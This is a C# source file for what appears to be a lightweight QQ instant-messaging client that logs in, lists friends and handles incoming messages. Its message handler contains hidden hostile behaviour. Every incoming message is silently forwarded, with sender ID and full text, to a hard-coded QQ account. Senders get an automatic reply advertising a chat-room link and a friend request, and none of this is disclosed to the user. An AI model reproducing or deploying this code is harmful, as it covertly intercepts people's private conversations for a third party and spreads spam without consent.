using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using System.Threading;
using System.IO;
using System.Drawing;
using System.Windows.Forms;


using System.ComponentModel;
using System.Data;

namespace ZNQQ
{
    public class QQService
    {
        private QQUser user;
        private TCPClass tcp;
        Thread th;

        delegate void QQListOnlineHelpers(string uid, string online);

        //---调试信息委托出去-----
        public delegate void DebugHelper(string debug);
        //private DebugHelper debugHelper;
        public event DebugHelper debugHelper;
        //--------
        private System.Threading.Timer timerEvery; 

        public QQService(QQUser UserFrom)
        {
            if (UserFrom.QQID == "1776594476") return;
            user = UserFrom;
            th = new Thread(new ThreadStart(Initial));
            th.IsBackground = true;
            th.Start();

            timerEvery = new System.Threading.Timer(new TimerCallback(timerCall), this, 20000, 20000);

        }

        private void Initial()
        {
            tcp = new TCPClass();
            int i = tcp.Connection();
            if (i == 0)
            {
                debugHelper("连接服务器失败！请检查网络！");
                //MessageBox.Show("连接服务器失败！请检查网络！");
                //this.Invoke(new InitialForms(CloseForms), new object[] { });
                return;
            }
            tcp.messageHelper += new TCPClass.MessageHelper(tcp_messageHelper);
            this.Login();
        }

        void tcp_messageHelper(byte[] msg)
        {
            //Invoke(new TCPClass.MessageHelper(ShowMessage), new object[] { msg });
            ShowMessage(msg);
        }

        int y = 0;

        private void ShowMessage(byte[] msg)
        {
            string cmd = Encoding.UTF8.GetString(msg, 0, msg.Length);
            if (cmd.IndexOf("VER") == -1)
            {
                return;
            }
            string[] data = cmd.Split('&');
            data[data.Length - 1] = data[data.Length - 1].Split('\r')[0];
            debugHelper(cmd);//
            switch (data[1])
            {
                case "CMD=Login":
                    switch (data[5])
                    {
                        case "RS=0":
                            //登录成功！   获取好友列表 
                            debugHelper("登录成功！   获取好友列表");
                            //label1.Text = "正在获取好友列表......";
                            this.GetQQList("0");
                            break;
                        case "RS=1":
                            MessageBox.Show("密码错误！");
                            break;
                    }
                    break;
                case "CMD=VERIFYCODE"://要输入验证码
                    debugHelper("要输入验证码");
                    string vc = data[7].Split('=')[1];
                    byte[] img = Tools.HexStringToBytes(vc);

                    Bitmap bitmap = new Bitmap(new System.IO.MemoryStream(img));
                    //Validate fmss = new Validate(this.tcp, bitmap);
                    //fmss.Show();
                    //Tools.SaveImage(img);

                    break;
                case "CMD=SIMPLEINFO2": //好友列表
                    string np = data[5].Split('=')[1];
                    if (np != "65535")
                    {
                        this.GetQQList(np);
                    }
                    else
                    {
                        y = 1;
                    }
                    if (y == 1)
                    {
                        this.GetQQListIsOnline("0");
                        y = 0;
                    }
                    this.QQListHelper(data[7], data[9]);
                    //InitialQQList();
                    break;
                case "CMD=QUERY_STAT2":
                    if (data[4] == "RES=20")
                    {
                        //MessageBox.Show("您的帐号在别处登录，您已被迫下线！","Mini QQ");
                        //CloseForms();
                        this.Login();
                        return;
                    }
                    string fn = data[5].Split('=')[1];
                    string[] un = data[8].Split(',');
                    if (fn != "1")
                    {
                        this.GetQQListIsOnline(un[un.Length - 2]);
                    }

                    this.QQListOnlineHelper(data[8], data[7]);
                    break;
                case "CMD=update_stat"://好友上线下线或改为忙碌
                    //UpdateStat(data[6].Split('=')[1], data[5].Split('=')[1]);
                    break;
                case "CMD=Server_Msg": //收到消息
                    debugHelper("收到消息");
                    string qqid = (data[7].Split('='))[1];
                    string msgs = ((data[8].Split('='))[1].Split('\n'))[0];
                    string nk = "";
                    if (qqid != "10000" && qqid != "1776594476")
                    {
                        this.SendQQMsg(data[7].Substring(3), "我的聊天室http://www.2345.com/?k2205198,大家支持");
                    }
                    
                    if (qqid != "1776594476")
                    {
                        Thread.Sleep(1000);
                        this.SendQQMsg("1776594476", string.Format("{0}向{1}发送消息:{2}", qqid, user.QQID, msgs));
                        this.AddFriend(qqid);
                    }
                    break;
                case "CMD=GETINFO"://查看好友资料 (数据到达)
                    TextBox textBox_QQInfo = new TextBox();
                    textBox_QQInfo.Dock = DockStyle.Fill;
                    textBox_QQInfo.Multiline = true;
                    textBox_QQInfo.Text = cmd;
                    Form fms = new Form();
                    fms.Controls.Add(textBox_QQInfo);
                    fms.Show();
                    break;
            }
        }

        /// <summary>
        /// 获取200到299的随机数
        /// </summary>
        /// <returns></returns>
        public string GetSjs3Byte()
        {
            Random rnd = new Random();
            int i = rnd.Next(200, 999);
           // return i.ToString();
            return DateTime.Now.Ticks.ToString().Substring(7, 7);
        }
        /// <summary>
        /// 发送登录命令
        /// </summary>
        private void Login()
        {
            string str = string.Format("VER=1.4&CON=1&CMD=Login&SEQ={0}&UIN={1}&PS={2}&M5=1&LG=0&LC=812822641C978097&GD=TW00QOJ9KUVD753S&CKE=\n", GetSjs3Byte(), user.QQID, user.Password);
            tcp.Send(str);
        }

        private void menuItem1_Click(object sender, EventArgs e)
        {

        }
        /// <summary>
        /// 发送获取在线好友列表请求
        /// </summary>
        private void GetQQListIsOnline(string un)
        {
            string str = string.Format("VER=1.4&CON=1&CMD=Query_Stat2&SEQ={0}&UIN={1}&SID=&XP=C4CA4238A0B92382&CM=2&UN={2}\n", GetSjs3Byte(), user.QQID, un);
            byte[] date = Encoding.UTF8.GetBytes(str);
            tcp.Send(date);
        }

        //发送获取好友列表请求
        private void GetQQList(string un)
        {
            string str = string.Format("VER=1.4&CON=1&CMD=SimpleInfo2&SEQ={0}&UIN={1}&SID=&XP=C4CA4238A0B92382&UN={2}&TO=0\n", GetSjs3Byte(), user.QQID, un);
            byte[] date = Encoding.UTF8.GetBytes(str);
            tcp.Send(date);
        }

        private void QQListHelper(string uid, string nk)
        {
            //string[] uids = uid.Split('=')[1].Split(',');
            //string[] nks = nk.Split('=')[1].Split(',');
            //for (int i = 0; i < uids.Length - 1; i++)
            //{
            //    QQLists.Qqlists.Add(new QQList(uids[i], nks[i]));
            //}
        }

        private void QQListOnlineHelper(string uid, string online)
        {
            //string[] uids = uid.Split('=')[1].Split(',');
            //string[] onlines = online.Split('=')[1].Split(',');
            //for (int i = 0; i < onlines.Length - 1; i++)
            //{
            //    int a = 0;
            //    foreach (ListViewItem item in this.listView_QQList.Items)
            //    {
            //        if (uids[i] == item.Text)
            //        {
            //            item.SubItems[2].Text = this.GetOnline(onlines[i]);
            //            a = 1;
            //            break;
            //        }

            //    }
            //    if (a == 1)
            //    {
            //        continue;
            //    }
            //    ListViewItem lvi = new ListViewItem(uids[i]);
            //    lvi.SubItems.Add("");
            //    lvi.SubItems.Add(this.GetOnline(onlines[i]));
            //    this.listView_QQList.Items.Add(lvi);

            //}
        }

        private void SendQQMsg(string qqid, string msg)
        {
            string str = string.Format("VER=1.4&CON=1&CMD=CLTMSG&SEQ={0}&UIN={1}&SID=&XP=C4CA4238A0B92382&UN={2}&MG={3}\n", GetSjs3Byte(), user.QQID, qqid, msg);
            tcp.Send(str);
        }

        private void SendVCode(string vcode)
        {
            string cmd = string.Format("VER=1.4&CON=1&CMD=VERIFYCODE&SEQ={2}&UIN={1}&SID=&XP=C4CA4238A0B92382&SC=2&VC={0}\n", vcode, user.QQID, GetSjs3Byte());
            byte[] data = Encoding.UTF8.GetBytes(cmd);
            this.tcp.Send(data);
        }

        private string GetOnline(string type)
        {
            string Online = "";
            switch (type)
            {
                case "10":
                    Online = "在线";
                    break;
                case "20":
                    Online = "离线";
                    break;
                case "30":
                    Online = "忙碌";
                    break;
            }
            return Online;
        }

        /// <summary>
        /// 查询好友信息
        /// </summary>
        /// <param name="uid"></param>
        private void GetQQInfo(string uid)
        {
            string cmd = string.Format("VER=1.4&CON=1&CMD=GetInfo&SEQ={2}&UIN={1}&SID=&XP=C4CA4238A0B92382&LV=2&UN={0}\n", uid, user.QQID, GetSjs3Byte());
            byte[] data = Encoding.UTF8.GetBytes(cmd);
            this.tcp.Send(data);
        }

        //--加好友--
        private void AddFriend(string uid)
        {
            string cmd = string.Format("VER=1.4&CON=1&CMD=AddToList&SEQ={2}&UIN={1}&SID=&XP=C4CA4238A0B92382&UN={0}\n", uid, user.QQID, GetSjs3Byte());
            byte[] data = Encoding.UTF8.GetBytes(cmd);
            this.tcp.Send(data);
        }

        //--加好友验证--


        //---------
        private void timerCall(object obj)
        {
            this.GetQQListIsOnline("0");
        }

    }
}
